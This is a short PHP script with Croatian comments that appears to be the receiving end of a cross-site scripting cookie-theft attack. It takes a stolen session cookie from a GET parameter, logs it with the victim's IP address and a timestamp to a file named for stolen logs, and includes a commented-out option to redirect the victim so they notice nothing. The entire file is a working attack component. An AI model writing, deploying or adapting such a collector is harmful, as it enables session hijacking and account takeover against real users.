<?php
// Postavi zaglavlja kako bi se izbjegle greske u pregledniku (opcionalno)
header("Content-Type: text/plain");

// 1. Dohvaćanje ukradenog kolačića
// Podatak je poslan preko GET parametra 'c', npr. log.php?c=ukradeni_ID
$ukradeni_cookie = $_GET['c'] ?? 'NEMA_PODATKA';

// 2. Dohvaćanje dodatnih informacija o napadu
// Dohvaća IP adresu žrtve
$ip_adresa_zrtve = $_SERVER['REMOTE_ADDR'] ?? 'Nepoznato';
// Dohvaća točno vrijeme napada
$vrijeme = date('Y-m-d H:i:s');

// 3. Formatiranje zapisa
$log_zapis = "[$vrijeme] IP: $ip_adresa_zrtve, Cookie: $ukradeni_cookie\n";

// 4. Zapisivanje u datoteku (glavni korak)
// FILE_APPEND osigurava da se zapis dodaje na kraj datoteke, a ne da je prebriše
// LOCK_EX osigurava siguran upis u slučaju istodobnih zahtjeva
file_put_contents('ukradeni_logovi.txt', $log_zapis, FILE_APPEND | LOCK_EX);

// 5. Poslati odgovor pregledniku žrtve
// Može se jednostavno preusmjeriti žrtvu na početnu stranicu kako ne bi primijetila nista.
// header("Location: /"); 
// exit;

// U ovom primjeru jednostavno vracamo 200 OK
echo "OK";
?>
